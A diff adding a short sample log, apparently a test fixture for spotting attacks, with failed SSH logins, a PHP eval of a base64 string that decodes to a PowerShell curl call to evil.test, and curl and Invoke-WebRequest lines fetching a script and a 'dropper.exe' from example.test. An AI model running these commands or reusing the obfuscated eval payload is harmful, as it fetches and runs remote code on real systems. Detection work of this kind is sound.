@@ -1,0 +1,7 @@
+Apr 12 10:12:01 web01 sshd[1201]: Failed password for invalid user admin from 192.168.1.50 port 51244 ssh2
+Apr 12 10:12:03 web01 sshd[1201]: Failed password for invalid user admin from 192.168.1.50 port 51245 ssh2
+Apr 12 10:14:22 app01 php: eval(base64_decode("cG93ZXJzaGVsbCBjdXJsIGh0dHA6Ly9ldmlsLnRlc3Qvc2g="));
+Apr 12 10:15:10 proxy01 request: curl http://example.test/script.sh
+Apr 12 10:16:45 windows01 security: powershell Invoke-WebRequest http://example.test/dropper.exe
+Apr 12 10:20:01 web01 nginx: 200 GET /index.html from 10.0.0.8
+
